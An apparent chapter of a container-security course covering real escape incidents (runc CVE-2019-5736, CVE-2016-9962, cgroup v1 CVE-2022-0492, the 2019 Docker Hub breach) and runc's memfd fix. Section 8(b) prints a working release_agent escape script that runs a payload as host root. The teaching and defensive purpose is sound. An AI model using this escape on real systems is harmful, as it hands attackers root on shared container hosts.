ARC 01 · THE PROBLEM

A shared kernel means every escape is one bug away, not one hypervisor away

A virtual machine's isolation boundary is enforced by hardware-assisted virtualization: the guest kernel never runs the host's own privileged instructions, and a guest-to-host escape means defeating an entirely separate execution domain — the hypervisor. A container has no such domain. Every namespace, cgroup, capability set, and seccomp filter from chapters 2 through 8 is a restriction applied to an ordinary Linux process running on the exact same kernel as everything else on the box. That kernel is shared, unmodified, and — as of this chapter — demonstrably not infallible.

This reframes what "container escape" means mechanically. It is not "defeat the isolation layer" in the abstract; it is one of exactly three concrete things going wrong:

  • A bug in the privileged code that builds the container. Something has to call clone(), write the cgroup interface files, drop capabilities, and load the seccomp filter — and it has to do all of that before the container's process exists to be restricted. That something (runc, crun) runs as real host root, however briefly, with one foot in the container's namespaces and one foot on the host filesystem. A bug there is a bug in the wall's construction crew, not the wall.
  • A gap in a kernel subsystem's namespace-awareness. Namespaces and cgroups were retrofitted onto a kernel that predates both by decades (chapter 1). Some interface files were designed for a single global hierarchy and only later had namespace boundaries drawn around them — and until every corner of that retrofit is airtight, a namespaced process can occasionally reach a lever that was never meant to be reachable from inside.
  • An operational or credential compromise with nothing to do with the kernel at all. The account database behind a registry, the token a CI pipeline uses to push images, the socket a daemon listens on — all of these are part of "container security" in the sense that operators say the phrase, and none of them are namespaces, cgroups, or capabilities.

This chapter examines one real, named incident from each category, at the level of detail you would need to have caught it, and closes with the question every one of them eventually raises: what did Docker's daemon architecture and Podman's daemonless one actually change about the outcome — and, just as importantly, what did neither of them change at all?

WHY THIS CHAPTER EXISTS

Chapters 1–14 taught you the mechanism assuming it works correctly. Real production systems have to assume it sometimes doesn't — not because the design is bad, but because "isolate untrusted code on a shared kernel" is one of the hardest correctness problems in systems software, and the industry's track record on it is a list of specific, fixable bugs rather than a single solved problem. Knowing that list, and exactly why each one worked, is what separates configuring a container platform from operating one.

ARC 03 · NAIVE SOLUTION

The naive trust model: "we didn't add capabilities, so we're covered"

Derive the failure honestly by first stating the belief that chapters 2–14 make entirely reasonable to hold. A team ships this, confident it reflects everything the course has taught so far:

Dockerfile + shellthe naive trust model, annotated
# Non-root user inside the container. No --privileged. No --cap-add.
# Default seccomp profile, default AppArmor/SELinux profile. Nothing exotic.
FROM ubuntu:22.04
RUN useradd -m appuser
USER appuser
CMD ["./service"]
shellthe reasoning that ships with it
$ docker run --rm -p 8080:8080 myimage
# "Even if an attacker gets remote code execution in ./service, they land as
#  an unprivileged UID, inside every namespace from chapter 2, under the
#  default seccomp profile from chapter 8. Container escape is a theoretical
#  concern for someone else's threat model — we didn't do anything reckless."

Every clause in that comment is true, and none of the incidents in this chapter is stopped by it. That is the point worth sitting with before §4 quantifies exactly why: this configuration hardens the container's own process, and every one of §11's incidents happens somewhere else — in the privileged process that built the container, in a kernel interface file that predates namespace-awareness, or in a database that has never run a single line of the application's code.

ARC 04 · WHY IT FAILS

The naive model protects the wrong process, and the math doesn't forgive that

Three quantified reasons the naive trust model above provides none of the protection it feels like it should:

  • The privileged builder is outside the container's own hardening entirely. docker exec and docker run both hand off to runc (or crun) running as real host root, in a brief window where it operates on the container's namespaces from the outside. The container's seccomp profile, its dropped capabilities, its non-root USER — none of that constrains runc itself, because runc is not the process those settings were ever applied to. A bug in runc's own exec path is invisible to every hardening flag in the Dockerfile above.
  • Blast radius is flat while attempt count scales with fleet size. A bug that corrupts the shared, on-disk low-level runtime binary (§8, §11) does not care which of a host's containers triggered it. With N containers on a host and even a conservative p = 2% chance that any given tenant can trigger a privileged exec (a CI job, a debug shell, an operator running docker exec), the expected number of exploit attempts scales linearly with N — while the payoff of a single success is constant: full host root, for every future invocation of that runtime, regardless of which container triggered the corruption. Hardening one more container's Dockerfile does not change either side of that equation.
  • Some incidents never touch a container's own configuration at all. The 190,000 accounts exposed in the 2019 Docker Hub breach (§11) were compromised through a database access at Docker's registry infrastructure — no seccomp profile, capability set, or namespace on any customer's host was involved on either side of that breach. "We hardened our containers" is simply not a claim that intersects with this incident category at all.
THE CATEGORY ERROR

The naive model conflates two different security domains: "is my application's process constrained" and "do I trust every privileged process that ever touches my container, plus every account system in the supply chain that delivered its image." Chapters 2–8 answer the first question thoroughly. This chapter is entirely about the second — and no amount of additional rigor on the first question moves the needle on it.

ARC 06 · WHY THAT STILL HURTS

Defense in depth has residual risk, and it has an operational bill

Stacking independent controls narrows the failure space; it does not close it, and closing most of it costs real engineering time that competes with shipping velocity.

  • Zero-days remain zero-days. No configuration flag defends against a bug nobody has found yet in runc's, crun's, or the kernel's own privileged code. Hardening reduces which categories of misuse are possible; it cannot reduce the existence of implementation bugs in code that, by construction, has to run with elevated privilege at some point.
  • Patch lag is measured in months, not days. Upgrading a fleet's low-level container runtime means coordinating maintenance windows, testing against every workload, and rolling every node — and real organizations take a long time to finish that rollout after a CVE ships. Drag the slider below: it is an illustrative model of unpatched-fleet decay after disclosure, not a measurement of any specific CVE, but the shape — a fast initial drop from urgent, security-conscious operators followed by a long tail of hosts that never get prioritized until the next audit — matches what internet-wide scans after major runtime CVEs have repeatedly found.
  • Capability-dropping breaks real workloads. Teams that drop capabilities aggressively regularly hit an application that quietly needed CAP_NET_BIND_SERVICE for a low port or CAP_CHOWN for a volume operation — and the fastest unblock is often to widen the capability set back, silently re-opening exactly the class of door §5 just closed.
  • Rootless has genuine functional limits (chapter 4). Some workloads need capabilities that only make sense against the real host UID namespace. Teams that hit those limits sometimes move back to rootful deployments for functionality reasons, undoing part of the structural mitigation §7 and §9 credit rootless containers with.

ARC 08 · INTERNAL IMPLEMENTATION

The exact mechanism: two CVEs, at the syscall and file level

Now the machinery itself — first the race that made CVE-2019-5736 the most consequential runtime CVE in the ecosystem's history, then the kernel interface files CVE-2022-0492 walked through. Both are described at the level you would need to patch either one yourself.

(a) CVE-2019-5736: the /proc/self/exe race, syscall by syscall

The setup: docker exec (or a container restart) drives runc to enter the container's namespaces as real host root and execute a target binary inside it. The attack replaces that target with a symlink to /proc/self/exe before this happens. Step through what runc actually does, and where the window opens.

(b) CVE-2022-0492: release_agent as an unnamespaced global hook

cgroups v1 (chapter 5 covered v2's unified hierarchy; v1's older multi-hierarchy design predates it) exposes a single, per-hierarchy release_agent file at the hierarchy's root — a path the kernel executes, with full host privilege and no namespace confinement whatsoever, whenever a cgroup configured with notify_on_release=1 transitions to zero processes. That execution happens via the kernel's usermode helper machinery, in the initial namespaces, regardless of which namespace's cgroup triggered it — because release_agent predates cgroup namespaces entirely.

shellthe mechanism, reconstructed from the publicly documented shape
# container has CAP_SYS_ADMIN and cgroup v1 is in use, unmitigated
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# resolve this container's own rootfs as seen from the HOST
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/payload" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /payload
echo "ps aux > $host_path/output" >> /payload
chmod a+x /payload

# emptying the cgroup fires the notify_on_release event → kernel runs
# release_agent AS HOST ROOT, OUTSIDE any container namespace
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

Every path in that reconstruction is a real cgroup v1 interface file: notify_on_release, release_agent, and cgroup.procs all exist on-disk under any mounted v1 hierarchy, exactly where the kernel documentation says they do. The privilege escalation is not a bug in any of those files' individual semantics — each behaves exactly as documented. It is a namespace-awareness gap: nothing stops a process with CAP_SYS_ADMIN inside its own user namespace from writing to a hierarchy-global file whose execution is defined to happen with zero namespace confinement at all.

ARC 11 · REAL-WORLD INCIDENTS

Five incidents, five root causes

CVE-2019-5736 — the runc file-descriptor race

Disclosed publicly on February 11, 2019 by researchers Adam Iwaniuk and Borys Popławski, this remains the most consequential container-runtime CVE to date, affecting every engine and orchestrator built on an unpatched runc — Docker below 18.09.2, containerd, cri-o, Apache Mesos' Mesos containerizer, and LXC 3.1.0, which shared enough of the same exec pattern to be vulnerable too. §8(a)'s stepper deck is the exact mechanism: a malicious container's exec target is replaced with a symlink to /proc/self/exe; when runc, as host root, enters the container's namespaces to run docker exec, it briefly holds a reference to its own on-disk binary; a race through /proc/<runc-pid>/fd/<n> overwrites that binary on the host filesystem, corrupting it for every future invocation by anyone. The response was industry-wide and fast: runc 1.0.0-rc6 shipped the memfd-based fix within days of disclosure, and every major cloud provider and orchestrator vendor pushed emergency patches inside the same week — a coordination speed that itself reflects how severe the ecosystem judged this one to be.

CVE-2016-9962 — the namespaced fd leak into ptrace

Disclosed by Aleksa Sarai in February 2017 (the CVE number was reserved the year before), this bug lived in runc's nsenter step — the C-level shim that enters a container's existing namespaces before Go's runtime, which cannot safely fork after starting multiple threads, takes back over. A file descriptor opened during that setup was not marked close-on-exec and survived into the container's own process, and because that descriptor referenced the host's procfs, a process inside the container could use it to ptrace(2) a process running outside its own PID namespace — a direct, if narrow, violation of the isolation PID namespaces exist to provide. The fix was close-on-exec hygiene across every file descriptor libcontainer's nsenter code touched before jumping into the container's namespace view, and it predates Podman's existence by roughly two years — a useful reminder that "which engine" is sometimes simply not a question a given CVE's timeline has an answer for yet.

CVE-2022-0492 — cgroups v1's release_agent escalation

Disclosed by researchers at Palo Alto Networks' Unit 42 in early 2022, this is the incident that made "which cgroup version does your fleet actually run" a security question rather than a purely operational one. §8(b) walks the mechanism: a container with CAP_SYS_ADMIN on a host still using the legacy cgroups v1 hierarchy can write to that hierarchy's release_agent file and trigger the kernel to execute it with full host privilege, entirely outside any namespace confinement. The immediate mitigation guidance was blunt and remains correct: don't grant containers CAP_SYS_ADMIN unless the workload genuinely requires it, and move hosts to the cgroup v2 unified hierarchy, which removed the global release_agent surface by design. Rootless containers were separately, structurally narrowed against this one — not because anyone patched anything for them, but because a remapped, unprivileged host UID simply cannot write the host's real release_agent file regardless of what capabilities the process believes it holds inside its own namespace.

The 2019 Docker Hub credential breach

Announced by Docker on April 26, 2019, this incident had nothing to do with runc, containerd, or any namespace — it was unauthorized access to a database backing Docker Hub, exposing usernames and hashed passwords for a subset of approximately 190,000 accounts, along with GitHub and Bitbucket access tokens used to trigger autobuilds. Docker's response was a forced password reset for affected accounts and a request that every user with autobuild integrations re-authorize their GitHub/Bitbucket connections, since a leaked autobuild token is a supply-chain risk that reaches further than the account it was issued to — it could be used to trigger builds that push attacker-influenced images into repositories other people already trust and pull from. It belongs in this chapter for exactly the reason §1 predicted it would: it is a "production container incident" by any operator's definition, and it is entirely outside the runtime-security domain every other incident in this chapter lives in.

What Podman's daemonless model did and didn't change

Internet-wide scanning research over the past decade has repeatedly found exposed Docker daemon APIs — dockerd sockets reachable without authentication — actively targeted by automated cryptojacking campaigns within minutes of being found; a compromised or misconfigured daemon is a single, high-value, always listening target, and docker.sock mounted into a container is one of the most common real-world container-escape misconfigurations reported by cloud security vendors, distinct from any of the four CVEs above. That specific incident shape structurally does not exist in Podman's default fork-exec model, because there is no persistent root daemon process to find. What did not change: Podman hosts running vulnerable runc or crun were, and remain, exactly as exposed to a low-level-runtime CVE as any Docker host running the same binary — the daemon's absence removed one attack surface, not the shared one underneath it.

ARC 13 · SOURCE CODE WALKTHROUGH

Reading the fix: runc's exec path, before and after

Where the CVE-2019-5736 fix actually lives, simplified from runc's real source shape but faithful to the structure and naming that shipped in 1.0.0-rc6 and after.

runc/
├── libcontainer/
│ ├── ● init_linux.go — container init: the code that, historically, resolved and exec'd the target binary by path
│ ├── ● standard_init_linux.go — where the memfd self-re-exec fix was added, ahead of the sensitive exec window
│ ├── process_linux.go — process creation, pipe setup between runc and the container init
│ ├── nsenter/nsenter.c — the C shim entering existing namespaces before Go's runtime starts threads (CVE-2016-9962 lived here)
│ └── cgroups/
│ ├── fs/ — cgroup v1 handlers; release_agent-adjacent interface files (CVE-2022-0492's territory)
│ └── fs2/ — cgroup v2 unified handlers; no release_agent surface by design
├── main_unix.go — CLI entrypoint; dispatches `runc exec`
└── exec.go — `runc exec` command implementation

First, the vulnerable shape — simplified to the part that matters. runc resolves and opens the exec target by path, inside the container's mount namespace, immediately before invoking it:

Go (simplified, pre-fix shape)libcontainer/standard_init_linux.go
func runExec(target string, args []string) error {
    // target here has already been resolved inside the container's mount
    // namespace — if the attacker replaced it with a symlink to
    // /proc/self/exe, this now refers to runc's OWN on-disk binary.
    fd, err := unix.Open(target, unix.O_PATH, 0)
    if err != nil { return err }

    // ── VULNERABLE WINDOW ──────────────────────────────────────
    // runc now holds an open reference to its own host binary. A
    // concurrent process inside the container can reach this same
    // file via /proc/<runc-pid>/fd/<n> and open it O_WRONLY —
    // a path the kernel's ETXTBSY protection does not cover, because
    // it guards execve()-time opens, not a second fd on the same inode.
    return unix.Fexecve(fd, args, os.Environ())
}

The fix does not try to close the race by timing — it removes the on-disk path from the sensitive window entirely, by re-executing runc itself from a sealed, anonymous, memory-backed file that no path can ever reference:

Go (simplified, fixed shape)libcontainer — memfd self-re-exec, added ahead of exec setup
func reexecSelfViaSealedMemfd() error {
    self, err := os.Open("/proc/self/exe") // this read happens ONCE, at startup
    if err != nil { return err }        // — before any container namespace is entered

    memfd, err := unix.MemfdCreate("runc_cloned", unix.MFD_ALLOW_SEALING)
    if err != nil { return err }
    io.Copy(os.NewFile(uintptr(memfd), ""), self)

    // Seal it: no further writes, no shrink, no grow — ever, from anyone,
    // including a process that later gains a reference to this fd.
    unix.FcntlInt(uintptr(memfd), unix.F_ADD_SEALS,
        unix.F_SEAL_SHRINK|unix.F_SEAL_GROW|unix.F_SEAL_WRITE|unix.F_SEAL_SEAL)

    // Re-exec runc itself from the sealed memfd, not from its on-disk path.
    // Every subsequent exec-setup step now runs from a descriptor that has
    // no path an attacker's symlink trick could ever resolve to, and that
    // rejects writes with EPERM even if a race still hands out a new fd.
    return unix.Fexecve(memfd, os.Args, os.Environ())
}
WHY IT WAS BUILT THIS WAY — THE PRINCIPLE TO STEAL

The fix's real lesson generalizes past this one CVE: prefer a descriptor you fully control over a path you have to re-resolve. A path can be raced, symlinked, or bind-mounted out from under you between resolution and use; a sealed, anonymous memfd has no path at all, and its seals make even a successfully raced file descriptor useless for tampering. The same instinct shows up elsewhere in the kernel's own later hardening — openat2()'s RESOLVE_NO_SYMLINKS, and FreeBSD's Capsicum capability model — all converging on the same idea: don't trust a name you have to look up twice.
